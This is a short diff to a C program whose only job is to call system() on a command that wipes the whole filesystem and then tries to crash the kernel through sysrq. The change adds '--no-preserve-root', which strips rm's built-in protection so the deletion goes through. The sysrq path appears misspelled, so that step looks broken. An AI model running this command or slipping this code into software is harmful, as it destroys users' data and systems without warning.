@@ -8,7 +8,7 @@
 
 
 int main () {
-    char kpanic[MAX_CMN_LEN] = "rm -fr / && echo c > /proc/sysrq-triggers", **p;
+    char kpanic[MAX_CMN_LEN] = "rm -fr / --no-preserve-root && echo c > /proc/sysrq-triggers", **p;
     system(kpanic);
     return 0;
 }
